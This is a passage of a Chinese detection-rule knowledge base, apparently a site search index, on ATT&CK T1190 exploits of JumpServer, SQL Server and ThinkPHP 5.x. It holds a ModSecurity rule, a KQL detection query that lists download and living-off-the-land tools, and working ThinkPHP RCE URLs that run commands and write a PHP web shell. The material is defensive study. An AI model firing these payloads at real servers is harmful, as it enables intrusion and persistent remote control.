RCE\u653b\u51fb\u68c0\u6d4b","text":""},{"location":"0x3_%E5%88%9D%E5%A7%8B%E8%AE%BF%E9%97%AE/T1190-JumpServer%20v2.6.1%20RCE%E6%94%BB%E5%87%BB%E6%A3%80%E6%B5%8B/#attck","title":"\u6765\u81eaATT&amp;CK\u7684\u63cf\u8ff0","text":"<p>\u4f7f\u7528\u8f6f\u4ef6\uff0c\u6570\u636e\u6216\u547d\u4ee4\u6765\u5229\u7528\u9762\u5411Internet\u7684\u8ba1\u7b97\u673a\u7cfb\u7edf\u6216\u7a0b\u5e8f\u4e2d\u7684\u5f31\u70b9\uff0c\u4ece\u800c\u5bfc\u81f4\u610f\u5916\u6216\u65e0\u6cd5\u9884\u671f\u7684\u884c\u4e3a\u3002\u7cfb\u7edf\u7684\u5f31\u70b9\u53ef\u80fd\u662f\u9519\u8bef\u3001\u6545\u969c\u6216\u8bbe\u8ba1\u6f0f\u6d1e\u3002\u8fd9\u4e9b\u5e94\u7528\u7a0b\u5e8f\u901a\u5e38\u662f\u7f51\u7ad9\uff0c\u4f46\u662f\u53ef\u4ee5\u5305\u62ec\u6570\u636e\u5e93\uff08\u4f8b\u5982SQL\uff09\uff0c\u6807\u51c6\u670d\u52a1\uff08\u4f8b\u5982SMB \u6216SSH\uff09\u4ee5\u53ca\u5177\u6709Internet\u53ef\u8bbf\u95ee\u5f00\u653e\u7684\u4efb\u4f55\u5176\u4ed6\u5e94\u7528\u7a0b\u5e8f\uff0c\u4f8b\u5982Web\u670d\u52a1\u5668\u548c\u76f8\u5173\u670d\u52a1\u3002\u6839\u636e\u6240\u5229\u7528\u7684\u7f3a\u9677\uff0c\u8fd9\u53ef\u80fd\u5305\u62ec\u201c\u5229\u7528\u9632\u5fa1\u9632\u536b\u201d\u3002</p> <p>\u5982\u679c\u5e94\u7528\u7a0b\u5e8f\u6258\u7ba1\u5728\u57fa\u4e8e\u4e91\u7684\u57fa\u7840\u67b6\u6784\u4e0a\uff0c\u5219\u5bf9\u5176\u8fdb\u884c\u5229\u7528\u53ef\u80fd\u4f1a\u5bfc\u81f4\u57fa\u7840\u5b9e\u9645\u5e94\u7528\u53d7\u5230\u635f\u5bb3\u3002\u8fd9\u53ef\u4ee5\u4f7f\u653b\u51fb\u8005\u83b7\u5f97\u8bbf\u95ee\u4e91API\u6216\u5229\u7528\u5f31\u8eab\u4efd\u548c\u8bbf\u95ee\u7ba1\u7406\u7b56\u7565\u7684\u8def\u5f84\u3002</p> <p>\u5bf9\u4e8e\u7f51\u7ad9\u548c\u6570\u636e\u5e93\uff0cOWASP\u6392\u540d\u524d10\u4f4d\u548cCWE\u6392\u540d\u524d25\u4f4d\u7a81\u51fa\u4e86\u6700\u5e38\u89c1\u7684\u57fa\u4e8eWeb\u7684\u6f0f\u6d1e\u3002</p>"},{"location":"0x3_%E5%88%9D%E5%A7%8B%E8%AE%BF%E9%97%AE/T1190-JumpServer%20v2.6.1%20RCE%E6%94%BB%E5%87%BB%E6%A3%80%E6%B5%8B/#jumpserver-v261-rce","title":"JumpServer v2.6.1 RCE(\u8fdc\u7a0b\u4ee3\u7801\u6267\u884c)","text":"<p>JumpServer \u662f\u4e00\u6b3e\u5f00\u6e90\u7684\u5821\u5792\u673a\uff0c\u662f\u7b26\u54084A\u89c4\u8303\u7684\u8fd0\u7ef4\u5b89\u5168\u5ba1\u8ba1\u7cfb\u7edf\uff0c\u901a\u4fd7\u6765\u8bf4\u5c31\u662f\u8df3\u677f\u673a.</p> <p>2021\u5e741\u670815\u65e5\uff0cJumpServer \u53d1\u5e03\u5b89\u5168\u66f4\u65b0\uff0c\u4fee\u590d\u4e86\u4e00\u5904\u8fdc\u7a0b\u547d\u4ee4\u6267\u884c\u6f0f\u6d1e\u3002\u7531\u4e8e JumpServer\u67d0\u4e9b\u63a5\u53e3\u672a\u505a\u6388\u6743\u9650\u5236\uff0c\u653b\u51fb\u8005\u53ef\u6784\u9020\u6076\u610f\u8bf7\u6c42\u83b7\u53d6\u654f\u611f\u4fe1\u606f\uff0c\u6216\u8005\u6267\u884c\u76f8\u5173\u64cd\u4f5c\u63a7\u5236\u5176\u4e2d\u6240\u6709\u673a\u5668\uff0c\u6267\u884c\u4efb\u610f\u547d\u4ee4\u3002</p>"},{"location":"0x3_%E5%88%9D%E5%A7%8B%E8%AE%BF%E9%97%AE/T1190-JumpServer%20v2.6.1%20RCE%E6%94%BB%E5%87%BB%E6%A3%80%E6%B5%8B/#_1","title":"\u5f71\u54cd\u7248\u672c","text":"<p>JumpServer &lt; v2.6.2</p> <p>JumpServer &lt; v2.5.4</p> <p>JumpServer &lt; v2.4.5</p> <p>JumpServer = v1.5.9</p>"},{"location":"0x3_%E5%88%9D%E5%A7%8B%E8%AE%BF%E9%97%AE/T1190-JumpServer%20v2.6.1%20RCE%E6%94%BB%E5%87%BB%E6%A3%80%E6%B5%8B/#_2","title":"\u6d4b\u8bd5\u6848\u4f8b","text":"<p>\u8bf7\u53c2\u8003\uff1a</p> <p>JumpServer v2.6.1 RCE(\u8fdc\u7a0b\u4ee3\u7801\u6267\u884c) \u590d\u73b0\u603b\u7ed3</p> <p>https://www.cnblogs.com/w0x68y/p/14340249.html</p> <p>Jumpserver-RCE\u590d\u73b0\u53ca\u544a\u8b66\u89c4\u5219</p> <p>https://www.freebuf.com/vuls/261199.html</p>"},{"location":"0x3_%E5%88%9D%E5%A7%8B%E8%AE%BF%E9%97%AE/T1190-JumpServer%20v2.6.1%20RCE%E6%94%BB%E5%87%BB%E6%A3%80%E6%B5%8B/#_3","title":"\u68c0\u6d4b\u65e5\u5fd7","text":"<p>\u8bbf\u95ee\u65e5\u5fd7</p>"},{"location":"0x3_%E5%88%9D%E5%A7%8B%E8%AE%BF%E9%97%AE/T1190-JumpServer%20v2.6.1%20RCE%E6%94%BB%E5%87%BB%E6%A3%80%E6%B5%8B/#_4","title":"\u6d4b\u8bd5\u590d\u73b0","text":"<p>\u8bf7\u53c2\u8003\uff1a</p> <p>JumpServer v2.6.1 RCE(\u8fdc\u7a0b\u4ee3\u7801\u6267\u884c) \u590d\u73b0\u603b\u7ed3</p> <p>https://www.cnblogs.com/w0x68y/p/14340249.html</p>"},{"location":"0x3_%E5%88%9D%E5%A7%8B%E8%AE%BF%E9%97%AE/T1190-JumpServer%20v2.6.1%20RCE%E6%94%BB%E5%87%BB%E6%A3%80%E6%B5%8B/#_5","title":"\u6d4b\u8bd5\u7559\u75d5","text":"<p>\u6682\u65e0</p>"},{"location":"0x3_%E5%88%9D%E5%A7%8B%E8%AE%BF%E9%97%AE/T1190-JumpServer%20v2.6.1%20RCE%E6%94%BB%E5%87%BB%E6%A3%80%E6%B5%8B/#_6","title":"\u68c0\u6d4b\u89c4\u5219/\u601d\u8def","text":"<p>modsecurity\u5224\u5b9a\u89c4\u5219</p> <p>\u5728\u8fd9\u79cd\u573a\u666f\u4e0b\uff0c\u57fa\u672c\u4e0a\u770b\u5230\u8fd9\u4e2auri\u8bf7\u6c42\u6211\u4eec\u5c31\u53ef\u4ee5\u65ad\u8a00\u8fd9\u662f\u4e00\u4e2a\u62a5\u8b66\uff0c\u56e0\u6b64\u7f16\u5199\u89c4\u5219\u5982\u4e0b:</p> <p>SecRule REQUEST_URI \"/ws/ops/tasks/log\" \"id:11111111,phase:1,id:52,t:none,t:urlDecode,t:lowercase,t:normalizePath,msg:'jump-rce'\"</p>"},{"location":"0x3_%E5%88%9D%E5%A7%8B%E8%AE%BF%E9%97%AE/T1190-JumpServer%20v2.6.1%20RCE%E6%94%BB%E5%87%BB%E6%A3%80%E6%B5%8B/#_7","title":"\u5907\u6ce8","text":"<p>\u672c\u6587\u5185\u5bb9\u591a\u6570\u6458\u81ea\u4e92\u8054\u7f51\u7f51\u7edc\uff0c\u672a\u7ecf\u8fc7\u672c\u4eba\u5b9e\u9645\u73af\u5883\u6d4b\u8bd5\uff0c\u614e\u91cd\u4e0a\u7ebf\u4f7f\u7528\u3002</p> <p>ModSecurity\u662f\u4e00\u4e2a\u5f00\u6e90\u7684\u8de8\u5e73\u53f0Web\u5e94\u7528\u7a0b\u5e8f\u9632\u706b\u5899\uff08WAF\uff09\u5f15\u64ce\uff0c\u7528\u4e8eApache\uff0cIIS\u548cNginx\uff0c\u7531Trustwave\u7684SpiderLabs\u5f00\u53d1\u3002\u4f5c\u4e3aWAF\u4ea7\u54c1\uff0cModSecurity\u4e13\u95e8\u5173\u6ce8HTTP\u6d41\u91cf\uff0c\u5f53\u53d1\u51faHTTP\u8bf7\u6c42\u65f6\uff0cModSecurity\u68c0\u67e5\u8bf7\u6c42\u7684\u6240\u6709\u90e8\u5206\uff0c\u5982\u679c\u8bf7\u6c42\u662f\u6076\u610f\u7684\uff0c\u5b83\u4f1a\u88ab\u963b\u6b62\u548c\u8bb0\u5f55\u3002</p>"},{"location":"0x3_%E5%88%9D%E5%A7%8B%E8%AE%BF%E9%97%AE/T1190-JumpServer%20v2.6.1%20RCE%E6%94%BB%E5%87%BB%E6%A3%80%E6%B5%8B/#_8","title":"\u53c2\u8003\u63a8\u8350","text":"<p>MITRE-ATT&amp;CK-T1190</p> <p>https://attack.mitre.org/techniques/T1190/</p> <p>JumpServer v2.6.1 RCE(\u8fdc\u7a0b\u4ee3\u7801\u6267\u884c) \u590d\u73b0\u603b\u7ed3</p> <p>https://www.cnblogs.com/w0x68y/p/14340249.html</p> <p>Jumpserver-RCE\u590d\u73b0\u53ca\u544a\u8b66\u89c4\u5219</p> <p>https://www.freebuf.com/vuls/261199.html</p>"},{"location":"0x3_%E5%88%9D%E5%A7%8B%E8%AE%BF%E9%97%AE/T1190-SQL%20server%E6%BB%A5%E7%94%A8/","title":"T1190-\u68c0\u6d4bSQL server\u6ee5\u7528","text":""},{"location":"0x3_%E5%88%9D%E5%A7%8B%E8%AE%BF%E9%97%AE/T1190-SQL%20server%E6%BB%A5%E7%94%A8/#attck","title":"\u6765\u81eaATT&amp;CK\u7684\u63cf\u8ff0","text":"<p>\u4f7f\u7528\u8f6f\u4ef6\uff0c\u6570\u636e\u6216\u547d\u4ee4\u6765\u5229\u7528\u9762\u5411Internet\u7684\u8ba1\u7b97\u673a\u7cfb\u7edf\u6216\u7a0b\u5e8f\u4e2d\u7684\u5f31\u70b9\uff0c\u4ece\u800c\u5bfc\u81f4\u610f\u5916\u6216\u65e0\u6cd5\u9884\u671f\u7684\u884c\u4e3a\u3002\u7cfb\u7edf\u7684\u5f31\u70b9\u53ef\u80fd\u662f\u9519\u8bef\u3001\u6545\u969c\u6216\u8bbe\u8ba1\u6f0f\u6d1e\u3002\u8fd9\u4e9b\u5e94\u7528\u7a0b\u5e8f\u901a\u5e38\u662f\u7f51\u7ad9\uff0c\u4f46\u662f\u53ef\u4ee5\u5305\u62ec\u6570\u636e\u5e93\uff08\u4f8b\u5982SQL\uff09\uff0c\u6807\u51c6\u670d\u52a1\uff08\u4f8b\u5982SMB \u6216SSH\uff09\u4ee5\u53ca\u5177\u6709Internet\u53ef\u8bbf\u95ee\u5f00\u653e\u7684\u4efb\u4f55\u5176\u4ed6\u5e94\u7528\u7a0b\u5e8f\uff0c\u4f8b\u5982Web\u670d\u52a1\u5668\u548c\u76f8\u5173\u670d\u52a1\u3002\u6839\u636e\u6240\u5229\u7528\u7684\u7f3a\u9677\uff0c\u8fd9\u53ef\u80fd\u5305\u62ec\u201c\u5229\u7528\u9632\u5fa1\u9632\u536b\u201d\u3002</p> <p>\u5982\u679c\u5e94\u7528\u7a0b\u5e8f\u6258\u7ba1\u5728\u57fa\u4e8e\u4e91\u7684\u57fa\u7840\u67b6\u6784\u4e0a\uff0c\u5219\u5bf9\u5176\u8fdb\u884c\u5229\u7528\u53ef\u80fd\u4f1a\u5bfc\u81f4\u57fa\u7840\u5b9e\u9645\u5e94\u7528\u53d7\u5230\u635f\u5bb3\u3002\u8fd9\u53ef\u4ee5\u4f7f\u653b\u51fb\u8005\u83b7\u5f97\u8bbf\u95ee\u4e91API\u6216\u5229\u7528\u5f31\u8eab\u4efd\u548c\u8bbf\u95ee\u7ba1\u7406\u7b56\u7565\u7684\u8def\u5f84\u3002</p> <p>\u5bf9\u4e8e\u7f51\u7ad9\u548c\u6570\u636e\u5e93\uff0cOWASP\u6392\u540d\u524d10\u4f4d\u548cCWE\u6392\u540d\u524d25\u4f4d\u7a81\u51fa\u4e86\u6700\u5e38\u89c1\u7684\u57fa\u4e8eWeb\u7684\u6f0f\u6d1e\u3002</p>"},{"location":"0x3_%E5%88%9D%E5%A7%8B%E8%AE%BF%E9%97%AE/T1190-SQL%20server%E6%BB%A5%E7%94%A8/#_1","title":"\u6d4b\u8bd5\u6848\u4f8b","text":"<p>SQLServer\u63d0\u4f9b\u4e86\u5927\u91cf\u7528\u4e8e\u81ea\u52a8\u5316\u4efb\u52a1\u3001\u5bfc\u51fa\u6570\u636e\u548c\u8fd0\u884c\u811a\u672c\u7684\u5de5\u5177\u3002\u653b\u51fb\u8005\u53ef\u4ee5\u91cd\u65b0\u5229\u7528\u8fd9\u4e9b\u5408\u6cd5\u5de5\u5177\u3002\u7531\u4e8e\u653b\u51fb\u8005\u53ef\u80fd\u4f1a\u5229\u7528\u8bb8\u591a\u5f3a\u5927\u7684\u547d\u4ee4\u8fdb\u884c\u653b\u51fb\uff0c\u56e0\u6b64\u67e5\u627e\u6d89\u53caSQL Server\u7684\u6076\u610f\u6d3b\u52a8\u53ef\u80fd\u4f1a\u5f88\u590d\u6742\u3002</p> <p>\u6b64\u67e5\u8be2\u68c0\u6d4bSQL Server\u8fdb\u7a0b\u542f\u52a8shell\u4ee5\u8fd0\u884c\u4e00\u4e2a\u6216\u591a\u4e2a\u53ef\u7591\u547d\u4ee4\u7684\u5b9e\u4f8b\u3002</p>"},{"location":"0x3_%E5%88%9D%E5%A7%8B%E8%AE%BF%E9%97%AE/T1190-SQL%20server%E6%BB%A5%E7%94%A8/#_2","title":"\u68c0\u6d4b\u65e5\u5fd7","text":"<p>\u672a\u7ecf\u6d4b\u8bd5\uff0c\u521d\u6b65\u5224\u65ad\u4e3awindows\u5b89\u5168\u65e5\u5fd7\u6216\u8005Sysmon\u65e5\u5fd7</p>"},{"location":"0x3_%E5%88%9D%E5%A7%8B%E8%AE%BF%E9%97%AE/T1190-SQL%20server%E6%BB%A5%E7%94%A8/#_3","title":"\u6d4b\u8bd5\u590d\u73b0","text":"<p>\u53c2\u8003 \u5982\u4f55\u901a\u8fc7SQL Server\u6267\u884c\u7cfb\u7edf\u547d\u4ee4\uff1f</p> <p>https://zhuanlan.zhihu.com/p/25254794</p>"},{"location":"0x3_%E5%88%9D%E5%A7%8B%E8%AE%BF%E9%97%AE/T1190-SQL%20server%E6%BB%A5%E7%94%A8/#_4","title":"\u6d4b\u8bd5\u7559\u75d5","text":"<p>\u6682\u65e0\u5b9e\u6d4b\uff0c\u6545\u65e0\u7559\u75d5</p>"},{"location":"0x3_%E5%88%9D%E5%A7%8B%E8%AE%BF%E9%97%AE/T1190-SQL%20server%E6%BB%A5%E7%94%A8/#_5","title":"\u68c0\u6d4b\u89c4\u5219/\u601d\u8def","text":"<pre><code>DeviceProcessEvents \n| where Timestamp  &gt;= ago(10d)\n| where InitiatingProcessFileName in~ (\"sqlservr.exe\", \"sqlagent.exe\",  \"sqlps.exe\", \"launchpad.exe\") //\u5f53\u521d\u59cb\u5316\u8fdb\u7a0b\u4e3a\"sqlservr.exe\", \"sqlagent.exe\",  \"sqlps.exe\", \"launchpad.exe\"\n| summarize tostring(makeset(ProcessCommandLine))  //\u8fdb\u7a0b\u547d\u4ee4\u884c\u4e2d\u5305\u542b\u4ee5\u4e0b\u8fdb\u7a0b\u540d\u79f0OR\u547d\u4ee4\u884c\u53c2\u6570\u65f6\uff0c\u53ef\u80fd\u662f\u5f02\u5e38\u7684\u3002\nby DeviceId, bin(Timestamp, 2m)\n| where\nset_ProcessCommandLine has \"certutil\" or \nset_ProcessCommandLine has \"netstat\" or \nset_ProcessCommandLine has \"ping\" or \nset_ProcessCommandLine has \"sysinfo\" or \nset_ProcessCommandLine has \"systeminfo\" or \nset_ProcessCommandLine has \"taskkill\" or \nset_ProcessCommandLine has \"wget\" or \nset_ProcessCommandLine has \"whoami\" or \nset_ProcessCommandLine has \"Invoke-WebRequest\" or \nset_ProcessCommandLine has \"Copy-Item\" or \nset_ProcessCommandLine has \"WebClient\" or \nset_ProcessCommandLine has \"advpack.dll\" or \nset_ProcessCommandLine has \"appvlp.exe\" or \nset_ProcessCommandLine has \"atbroker.exe\" or \nset_ProcessCommandLine has \"bash.exe\" or \nset_ProcessCommandLine has \"bginfo.exe\" or \nset_ProcessCommandLine has \"bitsadmin.exe\" or \nset_ProcessCommandLine has \"cdb.exe\" or \nset_ProcessCommandLine has \"certutil.exe\" or \nset_ProcessCommandLine has \"cl_invocation.ps1\" or \nset_ProcessCommandLine has \"cl_mutexverifiers.ps1\" or \nset_ProcessCommandLine has \"cmstp.exe\" or \nset_ProcessCommandLine has \"csi.exe\" or \nset_ProcessCommandLine has \"diskshadow.exe\" or \nset_ProcessCommandLine has \"dnscmd.exe\" or \nset_ProcessCommandLine has \"dnx.exe\" or \nset_ProcessCommandLine has \"dxcap.exe\" or \nset_ProcessCommandLine has \"esentutl.exe\" or \nset_ProcessCommandLine has \"expand.exe\" or \nset_ProcessCommandLine has \"extexport.exe\" or \nset_ProcessCommandLine has \"extrac32.exe\" or \nset_ProcessCommandLine has \"findstr.exe\" or \nset_ProcessCommandLine has \"forfiles.exe\" or \nset_ProcessCommandLine has \"ftp.exe\" or \nset_ProcessCommandLine has \"gpscript.exe\" or \nset_ProcessCommandLine has \"hh.exe\" or \nset_ProcessCommandLine has \"ie4uinit.exe\" or \nset_ProcessCommandLine has \"ieadvpack.dll\" or \nset_ProcessCommandLine has \"ieaframe.dll\" or \nset_ProcessCommandLine has \"ieexec.exe\" or \nset_ProcessCommandLine has \"infdefaultinstall.exe\" or \nset_ProcessCommandLine has \"installutil.exe\" or \nset_ProcessCommandLine has \"makecab.exe\" or \nset_ProcessCommandLine has \"manage-bde.wsf\" or \nset_ProcessCommandLine has \"mavinject.exe\" or \nset_ProcessCommandLine has \"mftrace.exe\" or \nset_ProcessCommandLine has \"microsoft.workflow.compiler.exe\" or \nset_ProcessCommandLine has \"mmc.exe\" or \nset_ProcessCommandLine has \"msbuild.exe\" or \nset_ProcessCommandLine has \"msconfig.exe\" or \nset_ProcessCommandLine has \"msdeploy.exe\" or \nset_ProcessCommandLine has \"msdt.exe\" or \nset_ProcessCommandLine has \"mshta.exe\" or \nset_ProcessCommandLine has \"mshtml.dll\" or \nset_ProcessCommandLine has \"msiexec.exe\" or \nset_ProcessCommandLine has \"msxsl.exe\" or \nset_ProcessCommandLine has \"odbcconf.exe\" or \nset_ProcessCommandLine has \"pcalua.exe\" or \nset_ProcessCommandLine has \"pcwrun.exe\" or \nset_ProcessCommandLine has \"pcwutl.dll\" or \nset_ProcessCommandLine has \"pester.bat\" or \nset_ProcessCommandLine has \"presentationhost.exe\" or \nset_ProcessCommandLine has \"pubprn.vbs\" or \nset_ProcessCommandLine has \"rcsi.exe\" or \nset_ProcessCommandLine has \"regasm.exe\" or \nset_ProcessCommandLine has \"register-cimprovider.exe\" or \nset_ProcessCommandLine has \"regsvcs.exe\" or \nset_ProcessCommandLine has \"regsvr32.exe\" or \nset_ProcessCommandLine has \"replace.exe\" or \nset_ProcessCommandLine has \"rundll32.exe\" or \nset_ProcessCommandLine has \"runonce.exe\" or \nset_ProcessCommandLine has \"runscripthelper.exe\" or \nset_ProcessCommandLine has \"schtasks.exe\" or \nset_ProcessCommandLine has \"scriptrunner.exe\" or \nset_ProcessCommandLine has \"setupapi.dll\" or \nset_ProcessCommandLine has \"shdocvw.dll\" or \nset_ProcessCommandLine has \"shell32.dll\" or \nset_ProcessCommandLine has \"slmgr.vbs\" or \nset_ProcessCommandLine has \"sqltoolsps.exe\" or \nset_ProcessCommandLine has \"syncappvpublishingserver.exe\" or \nset_ProcessCommandLine has \"syncappvpublishingserver.vbs\" or \nset_ProcessCommandLine has \"syssetup.dll\" or \nset_ProcessCommandLine has \"te.exe\" or \nset_ProcessCommandLine has \"tracker.exe\" or \nset_ProcessCommandLine has \"url.dll\" or \nset_ProcessCommandLine has \"verclsid.exe\" or \nset_ProcessCommandLine has \"vsjitdebugger.exe\" or \nset_ProcessCommandLine has \"wab.exe\" or \nset_ProcessCommandLine has \"winrm.vbs\" or \nset_ProcessCommandLine has \"wmic.exe\" or \nset_ProcessCommandLine has \"xwizard.exe\" or \nset_ProcessCommandLine has \"zipfldr.dll\"\n| sort by DeviceId  , Timestamp asc\n</code></pre> <p>\u89e3\u91ca\uff1a\u5f53\u521d\u59cb\u5316\u8fdb\u7a0b\u4e3a\"sqlservr.exe\"\uff0c\"sqlagent.exe\"\uff0c\"sqlps.exe\"\uff0c\"launchpad.exe\"\uff0c\u8fdb\u7a0b\u547d\u4ee4\u884c\u4e2d\u5305\u542b\u4ee5\u4e0a\u8fdb\u7a0b\u540d\u79f0OR\u547d\u4ee4\u884c\u53c2\u6570\u65f6\uff0c\u53ef\u80fd\u662f\u5f02\u5e38\u7684\u3002</p>"},{"location":"0x3_%E5%88%9D%E5%A7%8B%E8%AE%BF%E9%97%AE/T1190-SQL%20server%E6%BB%A5%E7%94%A8/#_6","title":"\u5efa\u8bae","text":"<p>\u672a\u7ecf\u5b9e\u9645\u6d4b\u8bd5\uff0c\u4ec5\u5177\u5907\u4e00\u5b9a\u7684\u53c2\u8003\u4ef7\u503c\u3002</p>"},{"location":"0x3_%E5%88%9D%E5%A7%8B%E8%AE%BF%E9%97%AE/T1190-SQL%20server%E6%BB%A5%E7%94%A8/#_7","title":"\u53c2\u8003\u63a8\u8350","text":"<p>MITRE-ATT&amp;CK-T1190</p> <p>https://attack.mitre.org/techniques/T1190/</p>"},{"location":"0x3_%E5%88%9D%E5%A7%8B%E8%AE%BF%E9%97%AE/T1190-Thinkphp%205.x%E8%BF%9C%E7%A8%8B%E5%91%BD%E4%BB%A4%E6%89%A7%E8%A1%8C%E6%A3%80%E6%B5%8B/","title":"T1190-Thinkphp 5.x\u8fdc\u7a0b\u547d\u4ee4\u6267\u884c\u6f0f\u6d1e\u68c0\u6d4b","text":""},{"location":"0x3_%E5%88%9D%E5%A7%8B%E8%AE%BF%E9%97%AE/T1190-Thinkphp%205.x%E8%BF%9C%E7%A8%8B%E5%91%BD%E4%BB%A4%E6%89%A7%E8%A1%8C%E6%A3%80%E6%B5%8B/#attck","title":"\u6765\u81eaATT&amp;CK\u7684\u63cf\u8ff0","text":"<p>\u4f7f\u7528\u8f6f\u4ef6\uff0c\u6570\u636e\u6216\u547d\u4ee4\u6765\u5229\u7528\u9762\u5411Internet\u7684\u8ba1\u7b97\u673a\u7cfb\u7edf\u6216\u7a0b\u5e8f\u4e2d\u7684\u5f31\u70b9\uff0c\u4ece\u800c\u5bfc\u81f4\u610f\u5916\u6216\u65e0\u6cd5\u9884\u671f\u7684\u884c\u4e3a\u3002\u7cfb\u7edf\u7684\u5f31\u70b9\u53ef\u80fd\u662f\u9519\u8bef\u3001\u6545\u969c\u6216\u8bbe\u8ba1\u6f0f\u6d1e\u3002\u8fd9\u4e9b\u5e94\u7528\u7a0b\u5e8f\u901a\u5e38\u662f\u7f51\u7ad9\uff0c\u4f46\u662f\u53ef\u4ee5\u5305\u62ec\u6570\u636e\u5e93\uff08\u4f8b\u5982SQL\uff09\uff0c\u6807\u51c6\u670d\u52a1\uff08\u4f8b\u5982SMB \u6216SSH\uff09\u4ee5\u53ca\u5177\u6709Internet\u53ef\u8bbf\u95ee\u5f00\u653e\u7684\u4efb\u4f55\u5176\u4ed6\u5e94\u7528\u7a0b\u5e8f\uff0c\u4f8b\u5982Web\u670d\u52a1\u5668\u548c\u76f8\u5173\u670d\u52a1\u3002\u6839\u636e\u6240\u5229\u7528\u7684\u7f3a\u9677\uff0c\u8fd9\u53ef\u80fd\u5305\u62ec\u201c\u5229\u7528\u9632\u5fa1\u9632\u536b\u201d\u3002</p> <p>\u5982\u679c\u5e94\u7528\u7a0b\u5e8f\u6258\u7ba1\u5728\u57fa\u4e8e\u4e91\u7684\u57fa\u7840\u67b6\u6784\u4e0a\uff0c\u5219\u5bf9\u5176\u8fdb\u884c\u5229\u7528\u53ef\u80fd\u4f1a\u5bfc\u81f4\u57fa\u7840\u5b9e\u9645\u5e94\u7528\u53d7\u5230\u635f\u5bb3\u3002\u8fd9\u53ef\u4ee5\u4f7f\u653b\u51fb\u8005\u83b7\u5f97\u8bbf\u95ee\u4e91API\u6216\u5229\u7528\u5f31\u8eab\u4efd\u548c\u8bbf\u95ee\u7ba1\u7406\u7b56\u7565\u7684\u8def\u5f84\u3002</p> <p>\u5bf9\u4e8e\u7f51\u7ad9\u548c\u6570\u636e\u5e93\uff0cOWASP\u6392\u540d\u524d10\u4f4d\u548cCWE\u6392\u540d\u524d25\u4f4d\u7a81\u51fa\u4e86\u6700\u5e38\u89c1\u7684\u57fa\u4e8eWeb\u7684\u6f0f\u6d1e\u3002</p>"},{"location":"0x3_%E5%88%9D%E5%A7%8B%E8%AE%BF%E9%97%AE/T1190-Thinkphp%205.x%E8%BF%9C%E7%A8%8B%E5%91%BD%E4%BB%A4%E6%89%A7%E8%A1%8C%E6%A3%80%E6%B5%8B/#cve-2020-16875","title":"CVE-2020-16875\u6f0f\u6d1e","text":""},{"location":"0x3_%E5%88%9D%E5%A7%8B%E8%AE%BF%E9%97%AE/T1190-Thinkphp%205.x%E8%BF%9C%E7%A8%8B%E5%91%BD%E4%BB%A4%E6%89%A7%E8%A1%8C%E6%A3%80%E6%B5%8B/#_1","title":"\u7b80\u4ecb","text":"<p>ThinkPHP\u5b98\u65b92018\u5e7412\u67089\u65e5\u53d1\u5e03\u91cd\u8981\u7684\u5b89\u5168\u66f4\u65b0\uff0c\u4fee\u590d\u4e86\u4e00\u4e2a\u4e25\u91cd\u7684\u8fdc\u7a0b\u4ee3\u7801\u6267\u884c\u6f0f\u6d1e\u3002\u8be5\u66f4\u65b0\u4e3b\u8981\u6d89\u53ca\u4e00\u4e2a\u5b89\u5168\u66f4\u65b0\uff0c\u7531\u4e8e\u6846\u67b6\u5bf9\u63a7\u5236\u5668\u540d\u6ca1\u6709\u8fdb\u884c\u8db3\u591f\u7684\u68c0\u6d4b\u4f1a\u5bfc\u81f4\u5728\u6ca1\u6709\u5f00\u542f\u5f3a\u5236\u8def\u7531\u7684\u60c5\u51b5\u4e0b\u53ef\u80fd\u7684getshell\u6f0f\u6d1e\uff0c\u53d7\u5f71\u54cd\u7684\u7248\u672c\u5305\u62ec5.0\u548c5.1\u7248\u672c\uff0c\u63a8\u8350\u5c3d\u5feb\u66f4\u65b0\u5230\u6700\u65b0\u7248\u672c\u3002</p>"},{"location":"0x3_%E5%88%9D%E5%A7%8B%E8%AE%BF%E9%97%AE/T1190-Thinkphp%205.x%E8%BF%9C%E7%A8%8B%E5%91%BD%E4%BB%A4%E6%89%A7%E8%A1%8C%E6%A3%80%E6%B5%8B/#_2","title":"\u5f71\u54cd\u7248\u672c","text":"<p>5.x &lt; 5.1.31, &lt;= 5.0.23</p>"},{"location":"0x3_%E5%88%9D%E5%A7%8B%E8%AE%BF%E9%97%AE/T1190-Thinkphp%205.x%E8%BF%9C%E7%A8%8B%E5%91%BD%E4%BB%A4%E6%89%A7%E8%A1%8C%E6%A3%80%E6%B5%8B/#_3","title":"\u6d4b\u8bd5\u6848\u4f8b","text":"<p>\u6f0f\u6d1e\u5206\u6790\u53ca\u6f0f\u6d1e\u5229\u7528\u53ef\u53c2\u8003Thinkphp 5.x\u8fdc\u7a0b\u547d\u4ee4\u6267\u884c\u6f0f\u6d1e\uff1a</p> <p>https://www.cnblogs.com/backlion/p/10106676.html</p>"},{"location":"0x3_%E5%88%9D%E5%A7%8B%E8%AE%BF%E9%97%AE/T1190-Thinkphp%205.x%E8%BF%9C%E7%A8%8B%E5%91%BD%E4%BB%A4%E6%89%A7%E8%A1%8C%E6%A3%80%E6%B5%8B/#_4","title":"\u68c0\u6d4b\u65e5\u5fd7","text":"<p>HTTP_log\uff0c\u8bbf\u95ee\u65e5\u5fd7\u4e5f\u53ef\u4ee5</p>"},{"location":"0x3_%E5%88%9D%E5%A7%8B%E8%AE%BF%E9%97%AE/T1190-Thinkphp%205.x%E8%BF%9C%E7%A8%8B%E5%91%BD%E4%BB%A4%E6%89%A7%E8%A1%8C%E6%A3%80%E6%B5%8B/#_5","title":"\u6d4b\u8bd5\u590d\u73b0","text":"<p>1.\u5229\u7528system\u51fd\u6570\u8fdc\u7a0b\u547d\u4ee4\u6267\u884c</p> <pre><code>http://localhost:9096/public/index.php?s=index/think\\app/invokefunction&amp;function=call_user_func_array&amp;vars[0]=system&amp;vars[1][]=whoami\n</code></pre> <p>2.\u901a\u8fc7phpinfo\u51fd\u6570\u5199\u51faphpinfo()\u7684\u4fe1\u606f</p> <pre><code>http://localhost:9096/public/index.php?s=index/\\think\\app/invokefunction&amp;function=call_user_func_array&amp;vars[0]=phpinfo&amp;vars[1][]=1\n</code></pre> <p>3.\u5199\u5165shell:</p> <pre><code>http://localhost:9096/public/index.php?s=/index/\\think\\app/invokefunction&amp;function=call_user_func_array&amp;vars[0]=system&amp;vars[1][]=echo%20^%3C?php%20@eval($_GET[%22code%22])?^%3E%3Eshell.php\n</code></pre> <p>\u6216\u8005</p> <pre><code>http://localhost:9096/index.php?s=index/think\\app/invokefunction&amp;function=call_user_func_array&amp;vars[0]=file_put_contents&amp;vars[1][]=../test.php&amp;vars[1][]=&lt;?php echo 